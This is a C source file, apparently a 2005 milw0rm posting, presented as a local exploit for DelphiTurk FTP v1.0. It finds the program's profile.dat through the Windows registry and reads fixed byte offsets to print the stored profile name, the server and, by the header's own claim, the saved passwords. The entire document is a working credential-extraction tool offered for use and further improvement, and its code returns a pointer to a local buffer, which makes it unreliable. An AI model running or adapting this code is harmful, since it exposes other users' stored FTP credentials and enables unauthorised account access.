/*****************************************************************

DelphiTurk FTP v1.0 Local Exploit by Kozan

Application: DelphiTurk FTP v1.0
Procuder: Delphiturk.com and Delphikitabi.com
Vulnerable Description: DelphiTurk FTP v1.0 passwords to local users.


Coded by: Kozan
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan[at]netmagister[dot]com


*****************************************************************/

#include <stdio.h>
#include <windows.h>


HKEY hKey;
#define BUFSIZE 100
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;


char *bilgi_oku(int adres,int uzunluk)
{

if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
0,
KEY_QUERY_VALUE,
&hKey) == ERROR_SUCCESS)
{

lRet = RegQueryValueEx( hKey, "ProgramFilesDir", NULL, NULL,
(LPBYTE) prgfiles, &dwBufLen);

if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
RegCloseKey(hKey);
printf("An error occured!");
return 0;
}

RegCloseKey(hKey);

}else{
printf("An error occured!\n");
exit(1);
}

strcat(prgfiles,"\\DelphiTurk\\Delphi T&#65533;rk FTP\\profile.dat");

int i;
FILE *fp;
char ch[100];
if((fp=fopen(prgfiles,"rb")) == NULL)
{
return "false";
}
fseek(fp,adres,0);
for(i=0;i<uzunluk;i++)
ch[i]=getc(fp);
ch[i]=NULL;
fclose(fp);
return ch;
}



int main()
{

printf("\r\n\r\nDelphiTurk FTP v1.0 Local Exploit by Kozan\n");
printf("www.netmagister.com - www.spyinstructors.com\r\n\r\n");
printf("This example exploit only shows the first record.\r\n");
printf("You may improve it freely...\r\n\r\n");
printf("ProfileName : %s\n",bilgi_oku(1,31));
printf("Ftp Server : %s\n",bilgi_oku(32,51));
printf("Ftp Server : %s\n",bilgi_oku(83,51));
printf("Ftp Server : %s\n",bilgi_oku(134,51));


return 0;


}

// milw0rm.com [2005-02-09]
